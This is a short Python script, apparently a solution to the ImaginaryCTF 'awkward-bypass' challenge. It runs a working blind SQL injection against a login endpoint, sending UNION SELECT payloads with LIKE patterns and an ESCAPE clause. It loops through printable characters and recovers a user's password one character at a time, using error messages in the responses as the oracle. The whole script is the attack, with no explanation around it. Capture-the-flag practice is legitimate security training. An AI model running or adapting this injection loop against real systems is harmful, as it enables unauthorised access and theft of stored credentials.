#!/usr/bin/env python3

import string
import requests

url = "https://awkward-bypass.chal.imaginaryctf.org/user"

base = '\' UNION SELECT username, NULL FROM users WHERE '
#base += 'username LIKE \''
base += 'password LIKE \''
tail = '%\' ESCAPE \'!\' --'
soln = ''

while True :
    found = False
    for c in string.printable[:95]:
        ch = c
        if ch in '%[]^-!':
            continue
        if ch == '_':
            ch = '!_'
        test = soln + ch
        payload = base + test + tail
        code = 400
        while code != 200:
            r = requests.post(url,data={'username':payload,'password':'test'})
            code = r.status_code
        log = soln+c
        print(log+": " if "Error" in r.text else log+": ***********")
        if not "Error" in r.text :
            found = True
            soln += c
            break
    if not found:
        break
